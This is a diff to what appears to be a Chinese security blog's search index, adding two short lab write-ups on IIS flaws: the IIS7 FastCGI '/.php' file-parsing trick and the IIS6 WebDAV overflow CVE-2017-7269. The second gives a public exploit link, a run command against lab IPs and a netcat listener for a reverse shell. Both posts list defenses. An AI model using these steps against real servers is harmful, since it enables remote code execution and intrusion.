@@ -4,6 +4,56 @@
   
     
     <entry>
+      <title>IIS7文件解析漏洞</title>
+      <link href="/archives/5f0a23e4.html"/>
+      <url>/archives/5f0a23e4.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h2><p>IIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg&#x2F;png后面加上&#x2F;.php，会将a001.jpg&#x2F;png<br>解析为php文件</p><h2 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h2><p>上传图片到网站允许目录 在图片上加上&#x2F;.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.148:8980/1.jpg/.php</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/hgwral.png" alt="0"></p><h2 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h2><p>1.配置 cgi fix_pathinfo（php inil中）为0并重启php-cgi程序</p><p>2.编辑映射模块-&gt;映射-&gt;打勾<br><img src="https://pic.888888.al/i/2023/03/04/hhh2zf.png" alt="1"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>IIS RCE-CVE-2017-7269</title>
+      <link href="/archives/812b5b48.html"/>
+      <url>/archives/812b5b48.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h2><p>Microsoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的<br>ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以 <strong>If:&lt;http:&#x2F;&#x2F;</strong> 开头的长标头执行任<br>意代码 PROPFIND请求</p><h2 id="2-影响范围"><a href="#2-影响范围" class="headerlink" title="2.影响范围"></a>2.影响范围</h2><p>WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。</p><h2 id="3-复现"><a href="#3-复现" class="headerlink" title="3.复现"></a>3.复现</h2><p>POC地址:<a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python iis <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">115</span> <span class="number">80</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">154</span> <span class="number">9999</span></span><br><span class="line">nc -lvnp <span class="number">9999</span></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/04/hcum09.png" alt="0"></p><h2 id="4-防御"><a href="#4-防御" class="headerlink" title="4.防御"></a>4.防御</h2><p><strong>1.关闭 WebDav服务</strong></p><p><strong>2.升级</strong></p><p><strong>3.部署安全设备</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>IIS短文件名漏洞</title>
       <link href="/archives/c8c55640.html"/>
       <url>/archives/c8c55640.html</url>
